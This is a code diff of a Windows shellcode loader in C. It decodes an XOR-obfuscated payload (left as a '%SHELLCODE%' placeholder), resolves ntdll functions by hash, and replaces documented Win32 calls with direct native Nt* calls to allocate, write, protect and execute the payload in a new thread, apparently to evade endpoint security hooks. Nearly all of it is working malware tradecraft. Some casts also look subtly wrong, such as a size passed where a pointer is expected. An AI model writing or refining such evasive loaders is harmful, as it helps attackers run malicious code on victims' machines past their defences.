@@ -1,6 +1,9 @@
 #include <windows.h>
 #include <stdio.h>
 
+#define TRUE 1
+#define FALSE 0
+
 typedef NTSYSAPI NTSTATUS(NTAPI* NtAlocVirtMem)(
     HANDLE ProcessHandle,
     PVOID* BaseAddress,
@@ -167,9 +170,9 @@ void main() {
     
     unsigned char payload[] = "%SHELLCODE%";
     void* exec;
+    DWORD old_protect;
     BOOL rv;
     HANDLE th;
-    DWORD old_protect;
 
     unsigned int ndtll_hash = 0x69e00346;   // ROL17
     unsigned int virtual_alloc_hash = 0x96124679; // ROR23
@@ -188,7 +191,8 @@ void main() {
 
     
     // Allocating executable memory
-    exec = VirtualAlloc(NULL, sizeof(payload), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
+    // exec = VirtualAlloc(NULL, sizeof(payload), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
+    _NtAlocVirtMem((HANDLE)-1, &exec, 0, (PSIZE_T)sizeof(payload), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
 
     // XORing shellcode
     for (size_t i = 0; i < sizeof(payload); i++) {
@@ -196,14 +200,18 @@ void main() {
     }
     
     // Copy shellcode into allocated memory
-    memcpy(exec, payload, sizeof(payload));
+    // memcpy(exec, payload, sizeof(payload));
+    _NtWriteVirtMem((HANDLE)-1, exec, payload, sizeof(payload), NULL);
 
     // Changing memory protection to PAGE_EXECUTE_READ
-    rv = VirtualProtect(exec, sizeof(payload), PAGE_EXECUTE_READ, &old_protect);
+    // rv = VirtualProtect(exec, sizeof(payload), PAGE_EXECUTE_READ, &old_protect);
+    _NtProtectVirtMem((HANDLE)-1, &exec, (PSIZE_T)sizeof(payload), PAGE_EXECUTE_READ, &old_protect);
 
     // Executing shellcode in a new thread
-    th = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)exec, NULL, 0, NULL);
+    // th = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)exec, NULL, 0, NULL);
+    _NtCreateThreadEx(&th, GENERIC_ALL, NULL, (HANDLE)-1, exec, NULL, FALSE, (ULONG_PTR)NULL, (SIZE_T)NULL, (SIZE_T)NULL, NULL);
 
-    WaitForSingleObject(th, -1);
+    // WaitForSingleObject(th, -1);
+    _NtWaitForSingleObject(th, FALSE, NULL);
 }
 
